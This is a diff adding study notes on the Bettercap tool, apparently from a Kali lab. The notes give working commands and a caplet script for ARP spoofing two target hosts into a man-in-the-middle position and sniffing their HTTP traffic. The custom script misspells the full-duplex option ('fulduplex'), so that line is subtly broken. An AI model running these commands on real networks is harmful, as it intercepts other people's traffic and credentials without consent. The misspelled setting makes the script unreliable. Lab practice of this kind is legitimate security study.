@@ -5,6 +5,34 @@ sudo apt-get install bettercap
 starting Bettercap
 ------------------------------
 bettercap
+==========Related Commands=================
 help
 net.probe on
 net.show
+
+=====ARP spoofing using Bettercap=============
+help arp.spoof
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.0.2.5
+arp.spoof on
+once done you can verify that targeted Machine has MacAddress for gateway as the one for 
+Kali< The machine used for MITM> 
+
+Spying on Network Devices:
+--------------------------------
+Along With the Above Settings 
+start 
+net.sniff on
+
+P.S:=This only works for Http command
+
+Custom Spoofing Script:
+------------------------------
+net.probe on
+set arp.spoof.fulduplex true
+set arp.spoof.targets 10.0.2.6,10.0.2.5
+arp.spoof on
+net.sniff on
+
+
+bettercap -iface eth0 -caplet ~/Documents/arpspoof.cap
